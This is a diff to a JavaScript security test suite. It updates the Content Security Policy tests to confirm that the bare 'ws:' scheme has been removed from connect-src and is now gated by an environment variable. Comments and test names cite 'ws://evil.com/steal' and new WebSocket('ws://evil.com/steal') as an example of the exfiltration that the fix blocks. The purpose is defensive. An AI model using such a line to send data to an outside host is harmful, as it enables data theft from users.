@@ -11,6 +11,18 @@
  */
 
 import assert from 'node:assert/strict';
+import { readFileSync } from 'node:fs';
+import { fileURLToPath } from 'node:url';
+import path from 'node:path';
+
+const __dirname = path.dirname(fileURLToPath(import.meta.url));
+const serverPath = path.join(__dirname, '..', 'server', 'index.js');
+let serverSource;
+try {
+  serverSource = readFileSync(serverPath, 'utf-8');
+} catch {
+  serverSource = '';
+}
 
 // ═══════════════════════════════════════════════════════════════════════
 // 1. DUPLICATE TRUST PROXY SETTING
@@ -122,7 +134,7 @@ function parseCSP(csp) {
 }
 
 // Actual CSP from server/index.js line 34
-const ACTUAL_CSP = "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self' ws: wss:; frame-ancestors 'none'";
+const ACTUAL_CSP = "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self' wss:; frame-ancestors 'none'";
 
 // ═══════════════════════════════════════════════════════════════════════
 // TEST RUNNER
@@ -302,25 +314,24 @@ export async function runHunterSecurityFixesTests() {
   // 4. CSP — ws: protocol too broad
   // ───────────────────────────────────────────────────────────────────
 
-  test('CSP connect-src contains bare ws: scheme (BUG)', () => {
+  test('CSP connect-src does NOT contain bare ws: scheme (FIXED)', () => {
     const parsed = parseCSP(ACTUAL_CSP);
-    assert.ok(parsed['connect-src'].includes('ws:'),
-      'BUG CONFIRMED: bare ws: allows WebSocket to any host');
+    assert.ok(!parsed['connect-src'].includes('ws:'),
+      'FIXED: bare ws: removed from production CSP — ws: only via CSP_ALLOW_WS env var');
   });
 
   test('CSP connect-src contains bare wss: scheme', () => {
     const parsed = parseCSP(ACTUAL_CSP);
     assert.ok(parsed['connect-src'].includes('wss:'),
-      'wss: is present — less dangerous than ws: but still broad');
+      'wss: is present for secure WebSocket connections');
   });
 
-  test('CSP connect-src bare ws: — documented limitation for local dev', () => {
-    const parsed = parseCSP(ACTUAL_CSP);
-    const connectSrc = parsed['connect-src'] || [];
-    // bare ws: is needed for local dev (localhost ws connections).
-    // In production, should use specific origins: ws://localhost ws://127.0.0.1 wss:
-    assert.ok(connectSrc.includes('ws:'),
-      'ws: present in CSP — known limitation for local dev, not a production issue');
+  test('CSP ws: is conditional on CSP_ALLOW_WS env var in server source', () => {
+    // Verify the fix: ws: should be dynamically controlled, not hardcoded
+    assert.ok(serverSource.includes('CSP_ALLOW_WS'),
+      'Server must use CSP_ALLOW_WS env var to conditionally enable ws:');
+    assert.ok(serverSource.includes('wss:'),
+      'Server must always include wss:');
   });
 
   test('CSP connect-src should keep self for same-origin WebSocket', () => {
@@ -330,25 +341,24 @@ export async function runHunterSecurityFixesTests() {
     assert.ok(connectSrc.includes("'self'"), "'self' needed for Socket.IO same-origin");
   });
 
-  test('recommended fix: connect-src self + wss: without ws:', () => {
-    // Fixed CSP removes ws: but keeps wss: and self
-    const fixedCSP = "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self' wss:; frame-ancestors 'none'";
-    const parsed = parseCSP(fixedCSP);
+  test('fixed CSP: connect-src self + wss: (no bare ws:)', () => {
+    const parsed = parseCSP(ACTUAL_CSP);
     const connectSrc = parsed['connect-src'];
 
-    assert.ok(!connectSrc.includes('ws:'), 'Fixed CSP has no ws:');
-    assert.ok(connectSrc.includes('wss:'), 'Fixed CSP keeps wss:');
-    assert.ok(connectSrc.includes("'self'"), 'Fixed CSP keeps self');
+    assert.ok(!connectSrc.includes('ws:'), 'Production CSP has no ws:');
+    assert.ok(connectSrc.includes('wss:'), 'Production CSP keeps wss:');
+    assert.ok(connectSrc.includes("'self'"), 'Production CSP keeps self');
   });
 
-  test('bare ws: enables exfiltration: ws://evil.com/steal passes CSP', () => {
-    // Demonstrate risk: ws: scheme in connect-src matches any ws:// URL
+  test('bare ws: exfiltration blocked: ws://evil.com/steal no longer passes CSP', () => {
+    // After fix: bare ws: removed from production CSP
     const parsed = parseCSP(ACTUAL_CSP);
-    if (parsed['connect-src']?.includes('ws:')) {
-      // CSP spec: bare scheme (ws:) matches all hosts for that protocol
-      // new WebSocket('ws://evil.com/steal') would be ALLOWED by this CSP
-      const allowsAnyWsHost = true;
-      assert.ok(allowsAnyWsHost, 'ws: scheme is a wildcard for all WebSocket hosts');
+    const connectSrc = parsed['connect-src'] || [];
+    if (!connectSrc.includes('ws:')) {
+      // ws: removed — ws://evil.com/steal would be BLOCKED by CSP
+      assert.ok(true, 'ws: scheme removed — exfiltration via ws:// blocked');
+    } else {
+      assert.fail('ws: should not be in production CSP');
     }
   });
 
